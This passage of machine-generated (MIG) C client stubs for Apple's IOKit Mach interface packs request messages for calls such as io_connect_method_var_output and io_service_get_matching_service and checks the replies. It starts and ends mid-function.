	mach_msg_type_number_t *var_outputCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t selector;
		mach_msg_type_number_t scalar_inputCnt;
		io_user_scalar_t scalar_input[16];
		mach_msg_type_number_t inband_inputCnt;
		char inband_input[4096];
		mach_vm_address_t ool_input;
		mach_vm_size_t ool_input_size;
		mach_msg_type_number_t inband_outputCnt;
		mach_msg_type_number_t scalar_outputCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t var_output;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_msg_type_number_t var_outputCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t var_output;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_msg_type_number_t var_outputCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_connect_method_var_output_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_method_var_output_t__defined */

	__DeclareSendRpc(2872, "io_connect_method_var_output")

	InP->NDR = NDR_record;

	InP->selector = selector;

	if (scalar_inputCnt > 16) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->scalar_input, (const char *) scalar_input, 8 * scalar_inputCnt);

	InP->scalar_inputCnt = scalar_inputCnt;

	msgh_size_delta = (8 * scalar_inputCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4224) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	if (inband_inputCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->inband_input, (const char *) inband_input, inband_inputCnt);

	InP->inband_inputCnt = inband_inputCnt;

	msgh_size_delta = _WALIGN_(inband_inputCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 4096);

	InP->ool_input = ool_input;

	InP->ool_input_size = ool_input_size;

	if (*inband_outputCnt < 4096)
		InP->inband_outputCnt = *inband_outputCnt;
	else
		InP->inband_outputCnt = 4096;

	if (*scalar_outputCnt < 16)
		InP->scalar_outputCnt = *scalar_outputCnt;
	else
		InP->scalar_outputCnt = 16;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2872;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2872, "io_connect_method_var_output")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2872, "io_connect_method_var_output")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_method_var_output_t__defined)
	check_result = __MIG_check__Reply__io_connect_method_var_output_t((__Reply__io_connect_method_var_output_t *)Out0P, (__Reply__io_connect_method_var_output_t **)&Out1P, (__Reply__io_connect_method_var_output_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_method_var_output_t__defined) */

	if (Out0P->inband_outputCnt > *inband_outputCnt) {
		(void)memcpy((char *) inband_output, (const char *) Out0P->inband_output,  *inband_outputCnt);
		*inband_outputCnt = Out0P->inband_outputCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) inband_output, (const char *) Out0P->inband_output, Out0P->inband_outputCnt);

	*inband_outputCnt = Out0P->inband_outputCnt;

	if (Out1P->scalar_outputCnt > *scalar_outputCnt) {
		(void)memcpy((char *) scalar_output, (const char *) Out1P->scalar_output, 8 *  *scalar_outputCnt);
		*scalar_outputCnt = Out1P->scalar_outputCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) scalar_output, (const char *) Out1P->scalar_output, 8 * Out1P->scalar_outputCnt);

	*scalar_outputCnt = Out1P->scalar_outputCnt;

	*var_output = (io_buf_ptr_t)(Out0P->var_output.address);
	*var_outputCnt = Out2P->var_outputCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_matching_service_t__defined)
#define __MIG_check__Reply__io_service_get_matching_service_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_matching_service_t(__Reply__io_service_get_matching_service_t *Out0P)
{

	typedef __Reply__io_service_get_matching_service_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2973) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->service.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->service.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_matching_service_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_matching_service */
mig_external kern_return_t io_service_get_matching_service
(
	mach_port_t master_port,
	io_string_t matching,
	mach_port_t *service
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_service_get_matching_service_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_matching_service_t__defined */

	__DeclareSendRpc(2873, "io_service_get_matching_service")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->matching, matching, 512);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy(InP->matching, matching, 512);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->matchingOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 512) + (_WALIGN_(InP->matchingCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2873;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2873, "io_service_get_matching_service")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2873, "io_service_get_matching_service")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_matching_service_t__defined)
	check_result = __MIG_check__Reply__io_service_get_matching_service_t((__Reply__io_service_get_matching_service_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_matching_service_t__defined) */

	*service = Out0P->service.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_matching_service_ool_t__defined)
#define __MIG_check__Reply__io_service_get_matching_service_ool_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_matching_service_ool_t(__Reply__io_service_get_matching_service_ool_t *Out0P)
{

	typedef __Reply__io_service_get_matching_service_ool_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2974) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->service.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->service.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_matching_service_ool_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_matching_service_ool */
mig_external kern_return_t io_service_get_matching_service_ool
(
	mach_port_t master_port,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	kern_return_t *result,
	mach_port_t *service
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_get_matching_service_ool_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_matching_service_ool_t__defined */

	__DeclareSendRpc(2874, "io_service_get_matching_service_ool")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t matchingTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->matching = matchingTemplate;
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
#else	/* UseStaticTemplates */
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
	InP->matching.deallocate =  FALSE;
	InP->matching.copy = MACH_MSG_PHYSICAL_COPY;
	InP->matching.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->matchingCnt = matchingCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2874;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2874, "io_service_get_matching_service_ool")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2874, "io_service_get_matching_service_ool")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_matching_service_ool_t__defined)
	check_result = __MIG_check__Reply__io_service_get_matching_service_ool_t((__Reply__io_service_get_matching_service_ool_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_matching_service_ool_t__defined) */

	*result = Out0P->result;

	*service = Out0P->service.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_authorization_id_t__defined)
#define __MIG_check__Reply__io_service_get_authorization_id_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_authorization_id_t(__Reply__io_service_get_authorization_id_t *Out0P)
{

	typedef __Reply__io_service_get_authorization_id_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2975) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_authorization_id_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_authorization_id */
mig_external kern_return_t io_service_get_authorization_id
(
	mach_port_t service,
	uint64_t *authorization_id
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t authorization_id;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t authorization_id;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_get_authorization_id_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_authorization_id_t__defined */

	__DeclareSendRpc(2875, "io_service_get_authorization_id")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2875;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2875, "io_service_get_authorization_id")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2875, "io_service_get_authorization_id")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_authorization_id_t__defined)
	check_result = __MIG_check__Reply__io_service_get_authorization_id_t((__Reply__io_service_get_authorization_id_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_authorization_id_t__defined) */

	*authorization_id = Out0P->authorization_id;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_set_authorization_id_t__defined)
#define __MIG_check__Reply__io_service_set_authorization_id_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_set_authorization_id_t(__Reply__io_service_set_authorization_id_t *Out0P)
{

	typedef __Reply__io_service_set_authorization_id_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2976) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_service_set_authorization_id_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_set_authorization_id */
mig_external kern_return_t io_service_set_authorization_id
(
	mach_port_t service,
	uint64_t authorization_id
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint64_t authorization_id;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_set_authorization_id_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_set_authorization_id_t__defined */

	__DeclareSendRpc(2876, "io_service_set_authorization_id")

	InP->NDR = NDR_record;

	InP->authorization_id = authorization_id;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2876;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2876, "io_service_set_authorization_id")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2876, "io_service_set_authorization_id")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_set_authorization_id_t__defined)
	check_result = __MIG_check__Reply__io_service_set_authorization_id_t((__Reply__io_service_set_authorization_id_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_set_authorization_id_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_server_version_t__defined)
#define __MIG_check__Reply__io_server_version_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_server_version_t(__Reply__io_server_version_t *Out0P)
{

	typedef __Reply__io_server_version_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2977) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_server_version_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_server_version */
mig_external kern_return_t io_server_version
(
	mach_port_t master_port,
	uint64_t *version
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t version;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t version;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
